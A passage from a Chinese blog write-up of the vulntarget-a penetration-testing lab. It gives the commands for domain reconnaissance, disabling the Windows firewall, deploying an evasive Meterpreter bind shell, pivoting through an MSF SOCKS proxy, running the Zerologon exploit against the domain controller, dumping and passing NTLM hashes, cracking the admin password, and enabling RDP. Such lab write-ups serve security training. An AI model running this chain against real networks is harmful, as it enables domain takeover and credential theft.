+<p><img src="/posts/d6f0653f/image-20230623082847322.png" alt="image-20230623082847322"></p>
+<p>代理服务器为kali的IP地址，端口为之前用kali中proxychains4的配置端口。</p>
+<p>测试成功后连接10.0.20.99/4pts.php。继续信息收集一波……</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">#执行命令<br>hostname<br>ipconfig /<span class="hljs-keyword">all</span><br>tasklist /svc<br>net <span class="hljs-type">time</span> /<span class="hljs-keyword">domain</span><br>net <span class="hljs-keyword">group</span> &quot;Domain Computers&quot; /doamin<br>net <span class="hljs-keyword">group</span> &quot;Domain Controllers&quot; /<span class="hljs-keyword">domain</span><br>net <span class="hljs-keyword">group</span> &quot;enterprise admins&quot; /<span class="hljs-keyword">domain</span><br>#收集信息<br>OS：Wins16<br>AV:Windows Defender<br><span class="hljs-keyword">Domain</span>:vulntarget.com<br><span class="hljs-keyword">Domain</span> Admins:Administrator<br><span class="hljs-keyword">Domain</span> Controller:WIN2019$<br>NIC:<span class="hljs-number">10.0</span><span class="hljs-number">.20</span><span class="hljs-number">.99</span>/<span class="hljs-number">10.0</span><span class="hljs-number">.10</span><span class="hljs-number">.111</span><br></code></pre></td></tr></table></figure>
+<p>发现该机器为win2016并且也有两个网段的网卡，说明还有内网中还有其他机器。</p>
+<p><img src="/posts/d6f0653f/image-20230623083419479.png" alt="image-20230623083419479"></p>
+<p>使用<code>tasklist</code>命令看是否运行着一些防病毒软件。</p>
+<p><img src="/posts/d6f0653f/image-20230623083617809.png" alt="image-20230623083617809"></p>
+<p>确实有一个windows自带的防护软件，此时需要使用命令进行关闭。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netsh firewall set opmode mode=disable<br></code></pre></td></tr></table></figure>
+<p><img src="/posts/d6f0653f/image-20230623084044535.png" alt="image-20230623084044535"></p>
+<p>可以看到公用网络的防火墙确实关闭了，但是域网络防火墙并没有关闭，此时需要利用MSF生成一个正向的木马并对木马进行免杀上传到目标主机。</p>
+<p>这里需要使用<em><strong>viper</strong></em>这款工具来生成免杀木马。</p>
+<p><img src="/posts/d6f0653f/image-20230623104521780.png" alt="image-20230623104521780"></p>
+<p><img src="/posts/d6f0653f/image-20230623104616711.png" alt="image-20230623104616711"></p>
+<p>通过蚁剑上传到目标主机点击执行以后可以看到6666端口被占用说明木马上传成功。</p>
+<p><img src="/posts/d6f0653f/image-20230623104832510.png" alt="image-20230623104832510"></p>
+<p>此时在kali的MSF中打开监听上线木马程序。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/multi/handler<br>set payload windows/x64/meterpreter/bind_tcp<br>set lport 6666<br>set RHOST 10.0.20.99<br>run<br></code></pre></td></tr></table></figure>
+<p><img src="/posts/d6f0653f/image-20230623105258959.png" alt="image-20230623105258959"></p>
+<p>输入<code>background/bg</code>将该程序放到后台。（因为之前失败了几次导致会话比较乱o(╥﹏╥)o）</p>
+<p><img src="/posts/d6f0653f/image-20230623110514687.png" alt="image-20230623110514687"></p>
+<p>添加路由：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">添加路由</span><br>use post/multi/manage/autoroute<br>set session 4<br></code></pre></td></tr></table></figure>
+<p>添加并修改代理(默认为1080端口)：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#添加代理</span><br>use auxiliary<span class="hljs-regexp">/server/</span>socks_proxy<br>run<br></code></pre></td></tr></table></figure>
+<p>此时我们还要修改proxychains4的代理配置将其端口修改为1080端口，丢弃掉之前用于搭建边界主机通信隧道的frp代理端口。</p>
+<p>（这里当然也可以在win2016中再加一个frp的通信隧道连接2019，但是MSF更加稳定，所以这里通过直接开启MSF的Socks5代理，利用之前在win7和win2016中建立的路由直接访问win2019）</p>
+<h2 id="三、域控"><a class="header-anchor" href="#三、域控">¶</a>三、域控</h2>
+<p>继续进行信息收集：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#域控判断</span><br><span class="hljs-attribute">ipconfig</span> /<span class="hljs-literal">all</span>  --&gt;获取DNS服务器地址：<span class="hljs-number">10.0.10.110</span><br><span class="hljs-attribute">net</span> time /doamian --&gt;获取域控地址：win2019.vulntarget.com<br><span class="hljs-attribute">ping</span> win2019.vulntarget.com --&gt; 返回地址：<span class="hljs-number">10.0.10.110</span><br><span class="hljs-comment">#Nmap扫描</span><br><span class="hljs-attribute">proxychains</span> nmap -Pn -sT -p <span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">445</span>,<span class="hljs-number">139</span> <span class="hljs-number">10.0.10.110</span><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>至此已经获取内网中域成员服务器也已经定位域控位置，接下来目标就是拿下域控，在此可直接尝试域控漏洞来进行权限提升：</p>
+<ol>
+<li>CVE-2020-1472</li>
+<li>CVE-2022–26923</li>
+<li>CVE-2021-42287&amp;42278</li>
+</ol>
+<p>这里尝试第一种域内提权手法…</p>
+<p>这里需要注意：将proxychains的代理配置改成MSF所起的代理信息…</p>
+</blockquote>
+<p>这里需要准备准备<em><strong>CVE-2020-1472</strong></em>与<em><strong>Impacket</strong></em>下载到Kali主机上…</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#CVE-2021-1472</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/dirkjanm/</span>CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">1472</span><br><span class="hljs-comment">#Impacket</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecureAuthCorp/im</span>packet<br><span class="hljs-comment">#after downlad</span><br>python3 -m pip install -r requirements.txt<br></code></pre></td></tr></table></figure>
+<p>利用CVE-2020-1472打空域控机器的密码……</p>
+<p><img src="/posts/d6f0653f/image-20230623112129672.png" alt="image-20230623112129672"></p>
+<p>绑定通往目标域的Host文件信息并使用<code>impactet</code>获取域控的Hash信息…</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#域名信息编辑</span><br><span class="hljs-attribute">vi</span> /etc/hosts<br><span class="hljs-attribute">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.<span class="hljs-number">110</span> vulntarget.com<br><span class="hljs-comment">#impactet</span><br><span class="hljs-attribute">proxychains</span> python3 secretsdump.py  vulntarget.com/WIN2019\$@<span class="hljs-number">10.0.10.110</span>  -just-dc  -no-pass<br></code></pre></td></tr></table></figure>
+<p>使用抓取的Hash值横向倒域控的CMD下…</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">方式一：<br>proxychains python<span class="hljs-number">3</span> smbexec.py -hashes aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">654</span>da<span class="hljs-number">31</span>ce<span class="hljs-number">51</span>cbeecfef<span class="hljs-number">99e637</span>be<span class="hljs-number">15</span> administrator<span class="hljs-title">@10</span>.<span class="hljs-number">0.10</span>.<span class="hljs-number">110</span><br>方式二：<br>proxychains python<span class="hljs-number">3</span> psexec.py vulntarget.com/administrator<span class="hljs-title">@10</span>.<span class="hljs-number">0.10</span>.<span class="hljs-number">110</span> -hashes aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">654</span>da<span class="hljs-number">31</span>ce<span class="hljs-number">51</span>cbeecfef<span class="hljs-number">99e637</span>be<span class="hljs-number">15</span><br></code></pre></td></tr></table></figure>
+<p><img src="/posts/d6f0653f/image-20230623113942986.png" alt="image-20230623113942986"></p>
+<p>使用John破解管理员密码…得出密码为<code>Admin@@666</code></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">john <span class="hljs-params">--wordlist=</span><span class="hljs-string">./pass.txt</span> <span class="hljs-string">./hash.txt</span> <span class="hljs-params">--format=NT</span><br></code></pre></td></tr></table></figure>
+<p>开启RDP服务并在防火墙中添加规则对其放行…远程桌面链接！</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment">#开启RDP</span><br>REG ADD <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">00000000</span> /f<br><span class="hljs-comment">#防火墙放行</span><br>netsh advfirewall firewall add <span class="hljs-keyword">rule</span> name=<span class="hljs-string">&quot;Remote Desktop&quot;</span> protocol=TCP dir=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">3389</span> action=allow<br><span class="hljs-comment">#关闭防火墙</span><br>netsh advfirewall show allprofile <span class="hljs-keyword">state</span>  //查看状态<br>netsh advfirewall <span class="hljs-built_in">set</span>  allprofile <span class="hljs-keyword">state</span> off  //关闭防火墙<br><span class="hljs-comment">#远程链接</span><br>proxychains rdesktop <span class="hljs-number">10.0</span>.<span class="hljs-number">10.110</span><br>username:vulntarget\administrator<br>password:Admin@<span class="hljs-number">666</span><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/">#靶场</a>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91/">#内网</a>
+      
+        <a href="/tags/%E7%BD%91%E5%AE%89/">#网安</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>vulntarget-a打靶</div>
+      <div>https://jsweetcoffee.github.io/posts/d6f0653f.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>SCxiaoyun</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/posts/391aa8cd.html" title="windows远程连接问题解决">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">windows远程连接问题解决</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/64d31b65.html" title="vulntarget-c打靶复现">
+                        <span class="hidden-mobile">vulntarget-c打靶复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments">
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"ejWQ4cLgEdFyaqpxh7H74jUL-gzGzoHsz","appKey":"esK2EV3cfDXbDYkhTkNEHyHD","path":"window.location.pathname","placeholder":"吐槽一下","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true,"verify":false,"notify":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+
+  
+  <script
+  async
+  defer
+  src="http://49.233.251.176:10087/api/application/embed?protocol=http&host=49.233.251.176:10087&token=0c8a92daa216c5bf">
+  </script>
+</div>  
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/containsWord.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"rect":"opacity:0.5","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
